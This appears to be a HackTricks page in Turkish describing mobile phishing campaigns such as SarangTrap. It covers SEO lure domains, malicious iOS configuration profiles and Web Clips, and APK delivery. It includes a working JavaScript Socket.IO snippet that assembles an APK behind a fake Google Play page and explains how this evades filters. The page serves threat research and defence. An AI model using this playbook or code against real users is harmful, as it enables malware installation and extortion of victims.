# Mobile Phishing & Malicious App Distribution (Android & iOS)

> [!INFO]
> Bu sayfa, tehdit aktörlerinin **malicious Android APKs** ve **iOS mobile-configuration profiles** dağıtmak için phishing (SEO, social engineering, fake stores, dating apps vb.) kullanırken başvurduğu teknikleri ele alır.
> İçerik, Zimperium zLabs tarafından ortaya çıkarılan SarangTrap campaign (2025) ve diğer kamuya açık araştırmalardan uyarlanmıştır.<sup>[[1]](#references)</sup>

## Attack Flow

1. **SEO/Phishing Infrastructure**
* Birbirine benzeyen düzinelerce domain kaydedin (dating, cloud share, car service…).
– Google'da sıralamaya girmek için `<title>` elementinde yerel dilde anahtar kelimeler ve emojiler kullanın.
– Aynı landing page üzerinde hem Android (`.apk`) hem de iOS kurulum talimatlarını barındırın.
2. **First Stage Download**
* Android: *unsigned* veya “third-party store” APK'sına doğrudan bağlantı.
* iOS: kötü amaçlı **mobileconfig** profile yönlendiren `itms-services://` veya düz HTTPS bağlantısı (aşağıya bakın).
3. **Android Post-install Behaviour**
* C2-gated execution, permission abuse, dropper bypasses, background collection ve diğer post-install malware davranışları, aşağıda yer alan özel Android Malware Post-Exploitation sayfasında ele alınır.
4. **iOS Delivery Technique**
* Tek bir **mobile-configuration profile**, cihazı “MDM”-benzeri supervision altına almak için `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` vb. isteyebilir.
* Social-engineering talimatları:
1. Settings'i açın ➜ *Profile downloaded*.
2. *Install* seçeneğine üç kez dokunun (phishing page üzerinde ekran görüntüleri).
3. unsigned profile güvenin ➜ attacker, App Store incelemesi olmadan *Contacts* ve *Photo* entitlement'larına erişir.
5. **iOS Web Clip Payload (phishing app icon)**
* `com.apple.webClip.managed` payload'ları, markalı bir icon/label ile **phishing URL'sini Home Screen'e sabitleyebilir**.
* Web Clips **full-screen** çalışabilir (browser UI'ını gizler) ve **non-removable** olarak işaretlenebilir; bu durumda icon'u kaldırmak için victim'ın profile'ı silmesi gerekir.<sup>[[3]](#references)</sup>
6. **Network Layer**
* Düz HTTP; genellikle `api.<phishingdomain>.com` gibi bir HOST header ile 80 portunda.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (TLS yok → tespit edilmesi kolay).

## Android Malware Post-Exploitation

C2, Accessibility abuse, overlays, ATS automation, staged DEX loading, premium SMS ve persistence gibi post-install Android malware tradecraft örnekleri için aşağıdaki sayfaya bakın:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Attackers, payload URL'sini gizlemek, URL/extension filtrelerini aşmak ve gerçekçi bir kurulum UX'i korumak için statik APK bağlantılarını giderek Google Play'e benzeyen lure'lara gömülü bir Socket.IO/WebSocket channel ile değiştiriyor.<sup>[[2]](#references)[[4]](#references)</sup>

Sahada gözlemlenen tipik client flow:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Basit kontrollerden kaçınmasının nedenleri:
- Statik bir APK URL'si açığa çıkmaz; payload, WebSocket frame'lerinden bellekte yeniden oluşturulur.
- Doğrudan `.apk` yanıtlarını engelleyen URL/MIME/uzantı filtreleri, WebSocket/Socket.IO üzerinden tünellenen binary verileri gözden kaçırabilir.
- WebSocket'leri çalıştırmayan crawler'lar ve URL sandbox'ları payload'ı almaz.

Ayrıca WebSocket tradecraft ve araçlarına bakın:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [Romantizmin Karanlık Yüzü: SarangTrap Şantaj Kampanyası](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Apple cihazları için Web Clips payload ayarları](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Endonezya ve Vietnam Android Kullanıcılarını Hedefleyen Banker Trojan](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
